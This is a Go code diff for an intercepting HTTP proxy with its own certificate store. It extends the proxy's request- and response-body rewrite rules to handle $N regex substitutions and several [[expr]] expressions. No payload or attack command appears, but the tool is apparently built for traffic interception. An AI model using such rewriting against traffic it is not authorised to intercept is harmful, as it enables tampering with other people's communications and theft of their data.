@@ -1288,14 +1288,33 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if len(ic.alterRequest) > 0 {
 									bodyStr := string(body)
 									for _, rule := range ic.alterRequest {
-										if rule.expr != "" {
+										if strings.Contains(rule.replace, "[[") {
 											bodyStr = rule.re.ReplaceAllStringFunc(bodyStr, func(match string) string {
 												submatches := rule.re.FindStringSubmatch(match)
-												result := evaluateExpr(rule.expr, submatches)
-												if result != "" {
-													return strings.Replace(rule.replace, "[["+rule.expr+"]]", result, -1)
+												replaced := rule.replace
+												for i, sm := range submatches {
+													if i > 0 {
+														replaced = strings.Replace(replaced, "$"+strconv.Itoa(i), sm, -1)
+													}
 												}
-												return match
+												for {
+													if idx := strings.Index(replaced, "[["); idx != -1 {
+														if endIdx := strings.Index(replaced[idx+2:], "]]"); endIdx != -1 {
+															expr := replaced[idx+2 : idx+2+endIdx]
+															result := evaluateExpr(expr, submatches)
+															if result != "" {
+																replaced = replaced[:idx] + result + replaced[idx+2+endIdx+2:]
+															} else {
+																break
+															}
+														} else {
+															break
+														}
+													} else {
+														break
+													}
+												}
+												return replaced
 											})
 										} else {
 											bodyStr = rule.re.ReplaceAllString(bodyStr, rule.replace)
@@ -1699,14 +1718,33 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if len(ic.alterResponse) > 0 {
 									bodyStr := string(body)
 									for _, rule := range ic.alterResponse {
-										if rule.expr != "" {
+										if strings.Contains(rule.replace, "[[") {
 											bodyStr = rule.re.ReplaceAllStringFunc(bodyStr, func(match string) string {
 												submatches := rule.re.FindStringSubmatch(match)
-												result := evaluateExpr(rule.expr, submatches)
-												if result != "" {
-													return strings.Replace(rule.replace, "[["+rule.expr+"]]", result, -1)
+												replaced := rule.replace
+												for i, sm := range submatches {
+													if i > 0 {
+														replaced = strings.Replace(replaced, "$"+strconv.Itoa(i), sm, -1)
+													}
 												}
-												return match
+												for {
+													if idx := strings.Index(replaced, "[["); idx != -1 {
+														if endIdx := strings.Index(replaced[idx+2:], "]]"); endIdx != -1 {
+															expr := replaced[idx+2 : idx+2+endIdx]
+															result := evaluateExpr(expr, submatches)
+															if result != "" {
+																replaced = replaced[:idx] + result + replaced[idx+2+endIdx+2:]
+															} else {
+																break
+															}
+														} else {
+															break
+														}
+													} else {
+														break
+													}
+												}
+												return replaced
 											})
 										} else {
 											bodyStr = rule.re.ReplaceAllString(bodyStr, rule.replace)
